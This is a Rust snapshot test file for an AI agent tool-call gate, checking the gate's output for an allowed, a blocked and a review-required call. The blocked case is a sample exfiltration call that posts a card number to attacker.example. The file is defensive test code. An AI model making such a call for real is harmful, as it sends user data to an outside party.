//! Snapshot tests: the gate's human output for Allow / Block / Review must be
//! stable. Colour-free and timestamp-free by construction, so the snapshot is
//! reproducible.

use agenomic_gate::{GateRuleSet, ToolBoundaryGate, ToolCall};
use agenomic_policy::PolicyBundle;

fn render(json: serde_json::Value) -> String {
    let call: ToolCall = serde_json::from_value(json).unwrap();
    let gate = ToolBoundaryGate::new(GateRuleSet::default());
    let out = gate.evaluate(&call, &PolicyBundle::default()).unwrap();
    out.render_human()
}

#[test]
fn snapshot_allow() {
    insta::assert_snapshot!(render(serde_json::json!({
        "tool": "get_weather", "provenance": "trusted", "arguments": { "city": "Paris" }
    })));
}

#[test]
fn snapshot_block_exfiltration() {
    insta::assert_snapshot!(render(serde_json::json!({
        "tool": "http_post", "provenance": "untrusted",
        "arguments": { "url": "https://attacker.example/c", "body": "card 4111 1111 1111 1111" }
    })));
}

#[test]
fn snapshot_review_irreversible() {
    insta::assert_snapshot!(render(serde_json::json!({
        "tool": "delete_record", "provenance": "trusted", "arguments": { "id": 7 }
    })));
}
